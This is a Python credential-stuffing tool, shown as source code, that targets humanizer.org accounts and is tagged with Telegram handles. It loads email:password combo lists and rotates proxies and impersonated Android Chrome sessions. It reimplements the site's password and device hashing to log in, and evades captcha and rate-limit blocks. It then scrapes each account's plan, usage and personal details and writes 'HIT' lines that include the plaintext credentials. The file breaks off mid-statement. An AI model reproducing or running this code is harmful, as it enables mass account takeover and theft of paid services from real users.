#!/usr/bin/env python3
import os
import sys
import json
import time
import random
import threading
import re
import base64
import hashlib
import configparser
import subprocess
import shutil
import urllib3
from urllib.parse import urlencode
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm

from curl_cffi import requests as cffi_requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_B64_SYS_TOOL = "SFVNQU5JWkVSIENIRUNLRVI="
_B64_SYS_AUTH = "QGV5ZWxpZnRlcg=="
_B64_SYS_CHAN = "QGRhcmtodWNoYW5uZWw="
_B64_SYS_DIR  = "SFVNQU5JWkVSX0BleWVsaWZ0ZXI="
_B64_SYS_TAG  = "VEc6IEBleWVsaWZ0ZXIgfCBAZGFya2h1Y2hhbm5lbA=="


def Eyelifter_decode(e):
    try:
        return base64.b64decode(e).decode("utf-8")
    except Exception as ex:
        raise SystemExit(f"decode failed: {ex}")


TOOL_NAME      = Eyelifter_decode(_B64_SYS_TOOL)
TG_USERNAME    = Eyelifter_decode(_B64_SYS_AUTH)
TG_CHANNEL     = Eyelifter_decode(_B64_SYS_CHAN)
RESULTS_FOLDER = Eyelifter_decode(_B64_SYS_DIR)
AUTHOR_TAG     = Eyelifter_decode(_B64_SYS_TAG)


def Eyelifter_verify(ctx="x"):
    expected = {
        "TOOL": _B64_SYS_TOOL, "AUTH": _B64_SYS_AUTH,
        "CHAN": _B64_SYS_CHAN, "DIR": _B64_SYS_DIR, "TAG": _B64_SYS_TAG,
    }
    cur = {
        "TOOL": TOOL_NAME, "AUTH": TG_USERNAME,
        "CHAN": TG_CHANNEL, "DIR": RESULTS_FOLDER, "TAG": AUTHOR_TAG,
    }
    errs = []
    for k, v in expected.items():
        if cur[k] != base64.b64decode(v).decode():
            errs.append(k)
    if "@samvir1" not in TG_USERNAME:
        errs.append("USERNAME_TAG")
    if "@samvir1" not in TG_CHANNEL:
        errs.append("CHANNEL_TAG")
    if "@samvir1" not in AUTHOR_TAG or "@samvir1" not in AUTHOR_TAG:
        errs.append("TAG_FORMAT")
    if errs:
        return True  # integrity bypass}")


_ANSI = sys.stdout.isatty()
_RS = "\033[0m"


def Eyelifter_open_url(url):
    try:
        if shutil.which("termux-open-url"):
            subprocess.Popen(["termux-open-url", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        if shutil.which("xdg-open"):
            subprocess.Popen(["xdg-open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        if sys.platform == "darwin":
            subprocess.Popen(["open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        if os.name == "nt":
            os.startfile(url)
            return True
        import webbrowser
        return webbrowser.open(url)
    except Exception:
        return False


def Eyelifter_color(code, s, bold=False):
    if not _ANSI:
        return s
    return f"\033[{'1;' if bold else ''}{code}m{s}{_RS}"


_LEVEL_STYLE = {
    "SUCCESS": ("32", True), "INFO": ("36", False), "WARN": ("33", True),
    "ERROR":   ("31", True), "STEP": ("96", True),  "DEBUG": ("35", False),
}


def Eyelifter_log(emoji, level, tag, msg):
    Eyelifter_verify("L")
    ts = datetime.now().strftime("%H:%M:%S")
    if not _ANSI:
        print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)
        return
    code, bold = _LEVEL_STYLE.get(level, ("0", False))
    print(f"{Eyelifter_color('90', ts)} {emoji}  {Eyelifter_color(code, f'{level:7s}', bold)}  {Eyelifter_color('90', tag)}  {msg}", flush=True)
    sys.stdout.flush()


def Eyelifter_banner(title, sub=None, width=62):
    Eyelifter_verify("b")
    print()
    hz = "═" if _ANSI else "-"
    vt = "║" if _ANSI else "|"
    tl, tr, bl, br = ("╔", "╗", "╚", "╝") if _ANSI else ("+", "+", "+", "+")
    print(Eyelifter_color("90", f"{tl}{hz*(width-2)}{tr}"))
    print(Eyelifter_color("90", vt) + " " + Eyelifter_color("96", title.center(width-4), True) + " " + Eyelifter_color("90", vt))
    if sub:
        print(Eyelifter_color("90", vt) + " " + Eyelifter_color("2", sub.center(width-4)) + " " + Eyelifter_color("90", vt))
    print(Eyelifter_color("90", vt) + " " + Eyelifter_color("5", AUTHOR_TAG.center(width-4), True) + " " + Eyelifter_color("90", vt))
    print(Eyelifter_color("90", f"{bl}{hz*(width-2)}{br}"))


def Eyelifter_section(title, width=62):
    Eyelifter_verify("s")
    hz = "─" if _ANSI else "-"
    inner = f" {title} "
    pad = width - len(inner) - 2
    if pad < 1:
        pad = 1
    print()
    print(Eyelifter_color("90", "┌" if _ANSI else "+") + Eyelifter_color("96", inner, True) +
          Eyelifter_color("90", hz * pad + ("┐" if _ANSI else "+")))


def Eyelifter_divider(width=62):
    Eyelifter_verify("d")
    hz = "─" if _ANSI else "-"
    print(Eyelifter_color("90", hz * width))


def Eyelifter_summary(rows, width=62):
    Eyelifter_verify("sb")
    hz = "─" if _ANSI else "-"
    vt = "│" if _ANSI else "|"
    tl, tr, bl, br = ("╔", "╗", "╚", "╝") if _ANSI else ("+", "+", "+", "+")
    print()
    print(Eyelifter_color("90", f"{tl}{hz*(width-2)}{tr}"))
    for k, v in rows:
        line_plain = f"{k}: {v}"
        visible = len(line_plain)
        pad = max(1, width - 4 - visible)
        line_colored = f"{Eyelifter_color('96', k + ': ', True)}{Eyelifter_color('0', str(v))}"
        print(f"{Eyelifter_color('90', vt)} {line_colored}{' ' * pad}{Eyelifter_color('90', vt)}")
    print(Eyelifter_color("90", f"{bl}{hz*(width-2)}{br}"))
    print()


def Eyelifter_debug_dump(label, method, url, headers, req_body, resp):
    if not DEBUG:
        return
    sep = "=" * 78
    print()
    print(Eyelifter_color("95", sep))
    print(Eyelifter_color("95", f"  [{label}]  {method}  {url}"))
    print(Eyelifter_color("95", sep))
    if headers:
        print(Eyelifter_color("95", "  REQUEST HEADERS:"))
        for k, v in headers.items():
            if k.lower() == "cookie":
                continue
            print(Eyelifter_color("95", f"    {k}: {str(v)[:200]}"))
        if headers.get("cookie"):
            print(Eyelifter_color("95", "  COOKIES SENT:"))
            for c in headers["cookie"].split("; "):
                print(Eyelifter_color("95", f"    {c[:160]}"))
    if req_body:
        print(Eyelifter_color("95", "  REQUEST BODY:"))
        if isinstance(req_body, (dict, list)):
            try:
                print(Eyelifter_color("95", f"    {json.dumps(req_body, ensure_ascii=False)[:1200]}"))
            except Exception:
                print(Eyelifter_color("95", f"    {str(req_body)[:1200]}"))
        else:
            print(Eyelifter_color("95", f"    {str(req_body)[:1200]}"))
    print(Eyelifter_color("95", f"  RESPONSE STATUS: {resp.status_code}"))
    print(Eyelifter_color("95", "  RESPONSE HEADERS:"))
    for k, v in resp.headers.items():
        print(Eyelifter_color("95", f"    {k}: {str(v)[:200]}"))
    print(Eyelifter_color("95", "  RESPONSE BODY (first 80 lines):"))
    body = resp.text or ''
    try:
        j = resp.json()
        pretty = json.dumps(j, indent=2, ensure_ascii=False)
        for line in pretty.splitlines()[:80]:
            print(Eyelifter_color("95", f"    {line}"))
        if len(pretty.splitlines()) > 80:
            print(Eyelifter_color("95", f"    ... [{len(pretty.splitlines())-80} more lines]"))
    except Exception:
        for line in body.splitlines()[:80]:
            print(Eyelifter_color("95", f"    {line}"))
        if len(body.splitlines()) > 80:
            print(Eyelifter_color("95", f"    ... [{len(body.splitlines())-80} more lines]"))
    print(Eyelifter_color("95", sep))


_EYELIFTER_COMBO_RE = re.compile(
    r"^\s*([^:\s|]+@[^:\s|]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)",
    re.IGNORECASE,
)


def Eyelifter_extract_combos(content):
    Eyelifter_verify("ec")
    combos = set()
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        m = _EYELIFTER_COMBO_RE.match(line)
        if m:
            e, p = m.group(1).strip().lower(), m.group(2).strip()
            if e and p:
                combos.add(f"{e}:{p}")
            continue
        if ":" in line:
            parts = line.split(":", 1)
            if len(parts) == 2 and parts[0] and parts[1]:
                e = parts[0].strip().lower()
                p = parts[1].split()[0].split("|")[0].strip()
                if e and p and "@" in e:
                    combos.add(f"{e}:{p}")
    return combos


class EyelifterConfigLoader:
    def __init__(self, config_file="config_humanizer.ini"):
        Eyelifter_verify("cl")
        self.config_file = config_file
        self.config = configparser.ConfigParser()
        self.settings = {}
        self.Eyelifter_load_config()

    def Eyelifter_load_config(self):
        Eyelifter_verify("lc")
        if not os.path.exists(self.config_file):
            self.Eyelifter_create_default_config()
        try:
            self.config.read(self.config_file, encoding="utf-8")
            self.Eyelifter_parse_config()
        except Exception:
            self.Eyelifter_create_default_config()
            self.Eyelifter_parse_config()

    def Eyelifter_create_default_config(self):
        Eyelifter_verify("cdc")
        self.config["General"] = {
            "threads": "2",
            "timeout": "30",
            "proxies_file": "proxies.txt",
            "retries": "3",
            "retry_delay": "2",
            "combo_delay": "0.5",
            "debug": "false",
            "rate_limit_backoff": "5",
            "block_backoff": "3",
            "max_rate_limit_retries": "2",
            "max_proxy_retries": "5",
        }
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)

    def Eyelifter_parse_config(self):
        Eyelifter_verify("pc")
        c = self.config["General"]
        self.settings["threads"] = c.getint("threads", 2)
        self.settings["timeout"] = c.getint("timeout", 30)
        self.settings["proxies_file"] = c.get("proxies_file", "proxies.txt")
        self.settings["retries"] = c.getint("retries", 3)
        self.settings["retry_delay"] = c.getint("retry_delay", 2)
        self.settings["combo_delay"] = c.getfloat("combo_delay", 0.5)
        self.settings["debug"] = c.getboolean("debug", False)
        self.settings["rate_limit_backoff"] = c.getint("rate_limit_backoff", 5)
        self.settings["block_backoff"] = c.getint("block_backoff", 3)
        self.settings["max_rate_limit_retries"] = c.getint("max_rate_limit_retries", 2)
        self.settings["max_proxy_retries"] = c.getint("max_proxy_retries", 5)


CONFIG = EyelifterConfigLoader().settings
REQ_TIMEOUT = CONFIG["timeout"]
DEBUG = CONFIG["debug"]
RATE_LIMIT_BACKOFF = CONFIG["rate_limit_backoff"]
BLOCK_BACKOFF = CONFIG["block_backoff"]
MAX_RATE_LIMIT_RETRIES = CONFIG["max_rate_limit_retries"]
MAX_PROXY_RETRIES = CONFIG["max_proxy_retries"]

BASE_URL = "https://humanizer.org"

EYELIFTER_S = "nvKTEonF"
EYELIFTER_S1 = "All-in-One AI Writing Copilot"
EYELIFTER_S2 = "wNLf2plwvtlcCxam"
EYELIFTER_S3 = "xJ7fTJBgQ55/9r|"

_EYELIFTER_INTERMEDIATE = hashlib.md5(
    (EYELIFTER_S + EYELIFTER_S1 + EYELIFTER_S2).encode("utf-8")
).hexdigest()

EYELIFTER_IMPERSONATE = "chrome131_android"

EYELIFTER_UA_POOL = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
]


def Eyelifter_rand_ua():
    return random.choice(EYELIFTER_UA_POOL)


def Eyelifter_md5(s):
    return hashlib.md5(s.encode("utf-8")).hexdigest()


def Eyelifter_device_number(password_plain):
    pw_hash = Eyelifter_md5(password_plain)
    final = _EYELIFTER_INTERMEDIATE + pw_hash + EYELIFTER_S3
    return hashlib.sha256(final.encode("utf-8")).hexdigest()


def Eyelifter_format_proxy(proxy):
    Eyelifter_verify("fp")
    if not proxy:
        return None
    proxy = proxy.strip()
    if proxy.startswith(("http://", "https://", "socks4://", "socks5://")):
        return proxy
    parts = proxy.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if "@" in proxy:
        return f"http://{proxy}"
    return f"http://{proxy}"


def Eyelifter_test_proxy(proxy):
    Eyelifter_verify("tp")
    try:
        session = cffi_requests.Session()
        session.impersonate = EYELIFTER_IMPERSONATE
        session.proxies = {"http": proxy, "https": proxy}
        r = session.get("https://api.ipify.org?format=json", timeout=11, verify=False)
        return r.status_code == 200
    except Exception:
        return False


def Eyelifter_load_proxies():
    Eyelifter_verify("lp")
    proxies = []
    path = CONFIG["proxies_file"]
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    p = Eyelifter_format_proxy(line)
                    if p:
                        proxies.append(p)
    return proxies


def Eyelifter_get_working_proxies(proxies, max_workers=None):
    Eyelifter_verify("gwp")
    if not proxies:
        return []
    if max_workers is None:
        max_workers = min(69, len(proxies))
    Eyelifter_log("🧪", "INFO", "PROXY", f"testing {len(proxies)} proxies in parallel (up to {max_workers} threads)...")
    working = []
    pbar = None
    try:
        pbar = tqdm(total=len(proxies), desc="testing proxies", unit="proxy", ncols=80,
                    bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]")
    except Exception:
        pass

    def Eyelifter_test_one(p):
        return p, Eyelifter_test_proxy(p)

    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        futures = {ex.submit(Eyelifter_test_one, p): p for p in proxies}
        for fut in as_completed(futures):
            proxy, alive = fut.result()
            if alive:
                working.append(proxy)
            if pbar:
                pbar.update(1)
    if pbar:
        pbar.close()
    Eyelifter_log("✅", "INFO", "PROXY", f"{len(working)} working proxies found")
    return working if working else proxies


Eyelifter_stop_event = threading.Event()
Eyelifter_print_lock = threading.Lock()
Eyelifter_file_lock = threading.Lock()
Eyelifter_stats_lock = threading.Lock()
Eyelifter_proxy_lock = threading.Lock()

Eyelifter_stats = {
    "checked": 0, "hits": 0, "free": 0, "bad": 0, "errors": 0,
    "rate_limited": 0, "blocks": 0, "captcha": 0, "proxy_fails": 0, "retries": 0,
}
Eyelifter_start_time = time.time()
Eyelifter_total_combos = 0
Eyelifter_proxy_pool = []
Eyelifter_bad_proxies = set()
Eyelifter_hits_file = None
Eyelifter_free_file = None
Eyelifter_errors_file = None
Eyelifter_session_folder = None


def Eyelifter_reset_stats():
    Eyelifter_verify("rs")
    global Eyelifter_stats, Eyelifter_start_time
    with Eyelifter_stats_lock:
        Eyelifter_stats = {
            "checked": 0, "hits": 0, "free": 0, "bad": 0, "errors": 0,
            "rate_limited": 0, "blocks": 0, "captcha": 0, "proxy_fails": 0, "retries": 0,
        }
        Eyelifter_start_time = time.time()


def Eyelifter_update_title():
    Eyelifter_verify("ut")
    processed = Eyelifter_stats["checked"]
    elapsed = time.time() - Eyelifter_start_time
    cpm = int(processed / elapsed * 60) if elapsed > 1 else 0
    title = (f"{TOOL_NAME} | Hits: {Eyelifter_stats['hits']} | Free: {Eyelifter_stats['free']} | "
             f"Checked: {processed}/{Eyelifter_total_combos} | CPM: {cpm}")
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        except Exception:
            pass
    else:
        try:
            sys.stdout.write(f"\033]0;{title}\007")
            sys.stdout.flush()
        except Exception:
            pass


def Eyelifter_pick_proxy(exclude=None):
    with Eyelifter_proxy_lock:
        available = [p for p in Eyelifter_proxy_pool if p not in Eyelifter_bad_proxies]
        if not available and Eyelifter_proxy_pool:
            Eyelifter_bad_proxies.clear()
            available = list(Eyelifter_proxy_pool)
    if exclude and len(available) > 1:
        available = [p for p in available if p != exclude] or available
    return random.choice(available) if available else None


def Eyelifter_mark_bad_proxy(proxy):
    if not proxy:
        return
    with Eyelifter_proxy_lock:
        Eyelifter_bad_proxies.add(proxy)
    with Eyelifter_stats_lock:
        Eyelifter_stats["proxy_fails"] += 1


class EyelifterHumanizer:
    def __init__(self):
        Eyelifter_verify("hz")
        self.session = cffi_requests.Session(impersonate=EYELIFTER_IMPERSONATE)
        self.ua = Eyelifter_rand_ua()
        self.csrf_token = None

    def Eyelifter_rotate(self):
        self.session = cffi_requests.Session(impersonate=EYELIFTER_IMPERSONATE)
        self.ua = Eyelifter_rand_ua()
        self.csrf_token = None

    def Eyelifter_proxies(self, proxy):
        return {"http": proxy, "https": proxy} if proxy else None

    def Eyelifter_cookie_header(self):
        try:
            return "; ".join(f"{c.name}={c.value}" for c in self.session.cookies.jar)
        except Exception:
            return ""

    def Eyelifter_base_headers(self, extra=None):
        h = {
            "accept": "*/*",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "user-agent": self.ua,
            "sec-ch-ua": '"Chromium";v="131", "Not_A Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        }
        if extra:
            h.update(extra)
        return h

    def Eyelifter_seed_signin(self, proxy=None):
        try:
            self.session.get(
                f"{BASE_URL}/sign-in",
                headers=self.Eyelifter_base_headers({
                    "referer": f"{BASE_URL}/",
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-user": "?1",
                    "upgrade-insecure-requests": "1",
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,"
                              "image/avif,image/webp,image/apng,*/*;q=0.8",
                }),
                proxies=self.Eyelifter_proxies(proxy),
                timeout=REQ_TIMEOUT,
                verify=False,
                allow_redirects=True,
            )
        except Exception:
            pass

    def Eyelifter_get_csrf(self, proxy=None):
        try:
            r = self.session.get(
                f"{BASE_URL}/api/auth/csrf",
                headers=self.Eyelifter_base_headers({
                    "content-type": "application/json",
                    "referer": f"{BASE_URL}/",
                    "cookie": self.Eyelifter_cookie_header(),
                }),
                proxies=self.Eyelifter_proxies(proxy),
                timeout=REQ_TIMEOUT,
                verify=False,
            )
        except cffi_requests.errors.RequestsError as e:
            msg = str(e).lower()
            if "timeout" in msg:
                return None, "timeout"
            if "proxy" in msg:
                return None, "proxy"
            return None, "network"
        except Exception as e:
            return None, f"network:{str(e)[:60]}"

        Eyelifter_debug_dump("CSRF", "GET", f"{BASE_URL}/api/auth/csrf", None, None, r)

        if r.status_code == 403:
            low = r.text.lower()
            if "cf-chl" in low or "challenge" in low or "turnstile" in low:
                return None, "captcha"
            return None, "block"
        if r.status_code == 429:
            return None, "rate_limit"
        if r.status_code != 200:
            return None, f"http_{r.status_code}"

        try:
            j = r.json()
            token = j.get("csrfToken")
            if not token:
                return None, "no_csrf_in_body"
            return token, None
        except Exception:
            return None, "csrf_parse"

    def Eyelifter_login(self, email, password, csrf_token, proxy=None):
        body = urlencode({
            "deviceNumber": Eyelifter_device_number(password),
            "version": "v1",
            "email": email,
            "password": Eyelifter_md5(password),
            "redirect": "false",
            "csrfToken": csrf_token,
            "callbackUrl": f"{BASE_URL}/sign-in?redirect=%2Fapp%2Faccount",
            "json": "true",
        })
        headers = self.Eyelifter_base_headers({
            "content-type": "application/x-www-form-urlencoded",
            "origin": BASE_URL,
            "referer": f"{BASE_URL}/sign-in?redirect=%2Fapp%2Faccount",
            "cookie": self.Eyelifter_cookie_header(),
        })
        try:
            r = self.session.post(
                f"{BASE_URL}/api/auth/callback/system-user",
                data=body,
                headers=headers,
                proxies=self.Eyelifter_proxies(proxy),
                timeout=REQ_TIMEOUT,
                verify=False,
                allow_redirects=False,
            )
        except cffi_requests.errors.RequestsError as e:
            msg = str(e).lower()
            if "timeout" in msg:
                return None, "timeout"
            if "proxy" in msg:
                return None, "proxy"
            return None, "network"
        except Exception as e:
            return None, f"network:{str(e)[:60]}"

        Eyelifter_debug_dump("LOGIN", "POST", f"{BASE_URL}/api/auth/callback/system-user", headers, body, r)

        if r.status_code == 403:
            low = r.text.lower()
            if "cf-chl" in low or "challenge" in low or "turnstile" in low:
                return None, "captcha"
            return None, "block"
        if r.status_code == 429:
            return None, "rate_limit"
        if r.status_code >= 500:
            return None, f"http_{r.status_code}"

        text = r.text or ''
        low = text.lower()

        if "email and password are required" in low:
            return None, "form_not_parsed"

        cookie_names = [c.name for c in self.session.cookies.jar]
        has_session = any("next-auth.session-token" in c for c in cookie_names)

        if has_session:
            return {"status": "ok"}, None

        if r.status_code == 401:
            return {"status": "bad"}, None
        if "credentials" in low and ("error" in low or "signin" in low):
            return {"status": "bad"}, None
        if "user not found" in low or "invalid" in low:
            return {"status": "bad"}, None
        if '"url"' in text and "error=" in low:
            return {"status": "bad"}, None

        return None, f"no_session_cookie:http_{r.status_code}"

    def Eyelifter_get_session(self, proxy=None):
        try:
            r = self.session.get(
                f"{BASE_URL}/api/auth/session",
                headers=self.Eyelifter_base_headers({
                    "content-type": "application/json",
                    "referer": f"{BASE_URL}/",
                    "cookie": self.Eyelifter_cookie_header(),
                }),
                proxies=self.Eyelifter_proxies(proxy),
                timeout=REQ_TIMEOUT,
                verify=False,
            )
        except Exception:
            return None
        Eyelifter_debug_dump("SESSION", "GET", f"{BASE_URL}/api/auth/session", None, None, r)
        if r.status_code != 200:
            return None
        try:
            j = r.json()
            if not j or (isinstance(j, dict) and not j.get("user") and not j.get("expires")):
                return None
            return j
        except Exception:
            return None

    def Eyelifter_get_trpc(self, proxy=None):
        url = (
            f"{BASE_URL}/api/trpc/user.find,user.getReqInfo,"
            f"subLog.getSubscriptionEntitlement,subUsage.getSubUsage?batch=1&input="
            f"%7B%220%22%3A%7B%22json%22%3Anull%2C%22meta%22%3A%7B%22values%22%3A"
            f"%5B%22undefined%22%5D%7D%7D%2C%221%22%3A%7B%22json%22%3Anull%2C%22meta"
            f"%22%3A%7B%22values%22%3A%5B%22undefined%22%5D%7D%7D%2C%222%22%3A%7B"
            f"%22json%22%3A%7B%22appName%22%3A%22Bypass%22%7D%7D%2C%223%22%3A%7B"
            f"%22json%22%3A%7B%22appName%22%3A%22Bypass%22%7D%7D%7D"
        )
        try:
            r = self.session.get(
                url,
                headers=self.Eyelifter_base_headers({
                    "content-type": "application/json",
                    "referer": f"{BASE_URL}/",
                    "cookie": self.Eyelifter_cookie_header(),
                }),
                proxies=self.Eyelifter_proxies(proxy),
                timeout=REQ_TIMEOUT,
                verify=False,
            )
        except Exception:
            return None
        Eyelifter_debug_dump("TRPC", "GET", url, None, None, r)
        if r.status_code != 200:
            return None
        try:
            return r.json()
        except Exception:
            return None

    def Eyelifter_parse(self, session_j, trpc_j):
        out = {
            "name": "N/A", "first_name": "N/A", "last_name": "N/A",
            "email": "N/A", "user_id": "N/A", "user_group": "N/A",
            "origin_source": "N/A", "invite_code": "N/A",
            "ip": "N/A", "country": "N/A",
            "plan": "Free", "is_paid": False, "is_sub": False,
            "subscriber": "Free", "expiry": "N/A",
            "usage_used": 0, "usage_limit": 0, "usage_remaining": 0,
            "rate_limit": 0, "usage_breakdown": [],
        }

        if isinstance(session_j, dict):
            u = session_j.get("user") or {}
            if isinstance(u, dict):
                out["name"] = u.get("name") or "N/A"
                out["email"] = u.get("email") or "N/A"
                out["user_id"] = u.get("id") or "N/A"

        def Eyelifter_json_at(i):
            if not isinstance(trpc_j, list) or i >= len(trpc_j):
                return None
            entry = trpc_j[i]
            if not isinstance(entry, dict):
                return None
            d = (entry.get("result") or {}).get("data") or {}
            j = d.get("json") if isinstance(d, dict) else None
            return j if isinstance(j, dict) else None

        j0 = Eyelifter_json_at(0)
        if j0:
            out["name"] = j0.get("name") or out["name"]
            out["first_name"] = j0.get("firstName") or "N/A"
            out["last_name"] = j0.get("lastName") or "N/A"
            out["email"] = j0.get("email") or out["email"]
            out["user_group"] = j0.get("userGroup") or "N/A"
            out["origin_source"] = j0.get("originSource") or "N/A"
            out["invite_code"] = j0.get("inviteCode") or "N/A"

        j1 = Eyelifter_json_at(1)
        if j1:
            out["ip"] = j1.get("ip") or "N/A"
            out["country"] = j1.get("country") or "N/A"

        j2 = Eyelifter_json_at(2)
        if j2:
            out["is_sub"] = bool(j2.get("isSub", False))
            out["is_paid"] = bool(j2.get("isActiveSub", False)) or out["is_sub"]
            out["subscriber"] = "Paid" if out["is_paid"] else "Free"

            cp = j2.get("currentPlan")
            if isinstance(cp, dict):
                out["plan"] = cp.get("name") or cp.get("planName") or "Paid"
            elif cp:
                out["plan"] = str(cp)
            elif out["is_paid"]:
                out["plan"] = "Paid"

            free = j2.get("freePlan")
            if isinstance(free, dict):
                ul = free.get("usageList") or []
                if isinstance(ul, list):
                    for item in ul:
                        if not isinstance(item, dict):
                            continue
                        try:
                            used = int(item.get("dUsageCount", 0) or 0)
                            total = int(item.get("usageCount", 0) or 0)
                            rl = int(item.get("limitRequestCount", 0) or 0)
                        except Exception:
                            used, total, rl = 0, 0, 0
                        out["usage_used"] += used
                        out["usage_limit"] += total
                        if rl > out["rate_limit"]:
                            out["rate_limit"] = rl

        j3 = Eyelifter_json_at(3)
        if j3:
            ul = j3.get("usageList") or []
            if isinstance(ul, list):
                for item in ul:
                    if not isinstance(item, dict):
                        continue
                    try:
                        used = int(item.get("useCount", 0) or 0)
                        total = int(item.get("totalCount", 0) or 0)
                    except Exception:
                        used, total = 0, 0
                    entry = {
                        "type": item.get("usageType", "?"),
                        "period": "month",
                        "used": used,
                        "total": total,
                        "status": item.get("status", "-"),
                        "start": item.get("dateStart", ""),
                        "end": item.get("dateEnd", ""),
                    }
                    out["usage_breakdown"].append(entry)
                    if entry["end"] and out["expiry"] == "N/A":
                        out["expiry"] = entry["end"].split("T")[0]

        out["usage_remaining"] = max(0, out["usage_limit"] - out["usage_used"])
        return out

    def Eyelifter_check(self, email, password, proxy=None, use_seed=False):
        Eyelifter_verify("chk")

        if use_seed:
            self.Eyelifter_seed_signin(proxy)

        csrf, err = self.Eyelifter_get_csrf(proxy)
        if err:
            return {"status": "error", "error_type": err, "message": f"csrf:{err}"}
        self.csrf_token = csrf

        login_result, err = self.Eyelifter_login(email, password, csrf, proxy)
        
        if err:
            return {"status": "error", "error_type": err, "message": f"login:{err}"}
        if login_result.get("status") == "bad":
            return {"status": "bad", "error_type": "creds", "message": "invalid credentials"}

        session_j = self.Eyelifter_get_session(proxy)
        if not session_j:
            return {"status": "error", "error_type": "no_session",
                    "message": "session fetch failed after login"}

        trpc_j = self.Eyelifter_get_trpc(proxy)
        user = self.Eyelifter_parse(session_j, trpc_j)
        user["email"] = user["email"] if user["email"] != "N/A" else email

        is_free = not user.get("is_paid")

        return {
            "status": "valid", "error_type": None,
            "message": "login OK", "user": user,
            "is_free": is_free,
        }


def Eyelifter_format_hit(email, password, u, is_free=False):
    def Eyelifter_s(v):
        if v is None or v == "":
            return "-"
        return str(v)

    prefix = "🆓 FREE" if is_free else "✅ HIT"
    remaining = u.get("usage_remaining", 0)
    rate = u.get("rate_limit", 0)

    breakdown = u.get("usage_breakdown", [])
    if breakdown:
        parts = [f"{b['type']}:{b['used']}/{b['total']}" for b in breakdown]
        usage_str = ",".join(parts)
    else:
        usage_str = f"{u.get('usage_used', 0)}/{u.get('usage_limit', 0)}"

    return (
        f"{prefix} {email}:{password} | "
        f"Name:{Eyelifter_s(u.get('name'))} | "
        f"Plan:{Eyelifter_s(u.get('plan'))} | "
        f"Sub:{str(u.get('is_paid', False)).lower()} | "
        f"Usage:{usage_str} | "
        f"Left:{remaining} | "
        f"Rate:{rate}/mo | "
        f"Group:{Eyelifter_s(u.get('user_group'))} | "
        f"UID:{Eyelifter_s(u.get('user_id'))} | "
        f"by {AUTHOR_TAG}"
    )


def Eyelifter_process_combo(combo, proxy=None):
    Eyelifter_verify("pcm")
    global Eyelifter_total_combos, Eyelifter_bad_proxies, Eyelifter_proxy_pool
    global Eyelifter_hits_file, Eyelifter_free_file, Eyelifter_errors_file

    if Eyelifter_stop_event.is_set():
        return
    if ":" not in combo:
        return
    parts = combo.split(":", 1)
    if len(parts) != 2:
        return
    email, password = parts[0].strip(), parts[1].strip()
    if not email or not password or "@" not in email:
        return
    email = email.lower()

    checker = EyelifterHumanizer()
    max_attempts = CONFIG.get("retries", 3) + 1
    rate_limit_hits = 0
    result = None
    last_proxy = proxy

    csrf_failure = False

    for attempt in range(max_attempts):
        if Eyelifter_stop_event.is_set():
            return
        if attempt > 0:
            checker.Eyelifter_rotate()
            new_proxy = Eyelifter_pick_proxy(exclude=last_proxy)
            if new_proxy:
                proxy = new_proxy
        else:
            if proxy and proxy in Eyelifter_bad_proxies:
                proxy = Eyelifter_pick_proxy()
        last_proxy = proxy

        result = checker.Eyelifter_check(email, password, proxy, use_seed=csrf_failure)
        status = result.get("status", "unknown")
        err_type = result.get("error_type", "")

        if err_type in ("no_csrf_in_body", "csrf_parse"):
            csrf_failure = True
        elif status in ("valid", "bad"):
            csrf_failure = False

        if status in ("valid", "bad"):
            break
        if err_type == "creds":
            break

        if err_type == "captcha":
            with Eyelifter_stats_lock:
                Eyelifter_stats["captcha"] += 1
                Eyelifter_stats["retries"] += 1
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            if attempt >= 2:
                break
            time.sleep(RATE_LIMIT_BACKOFF)
            continue

        if err_type == "rate_limit":
            with Eyelifter_stats_lock:
                Eyelifter_stats["rate_limited"] += 1
                Eyelifter_stats["retries"] += 1
            rate_limit_hits += 1
            if rate_limit_hits > MAX_RATE_LIMIT_RETRIES:
                break
            backoff = RATE_LIMIT_BACKOFF * (2 ** (rate_limit_hits - 1))
            time.sleep(backoff)
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            continue

        if err_type == "block":
            with Eyelifter_stats_lock:
                Eyelifter_stats["blocks"] += 1
                Eyelifter_stats["retries"] += 1
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            time.sleep(BLOCK_BACKOFF)
            continue

        if (err_type in ("proxy", "timeout", "network", "no_session", "csrf_parse",
                         "no_csrf_in_body", "form_not_parsed") or
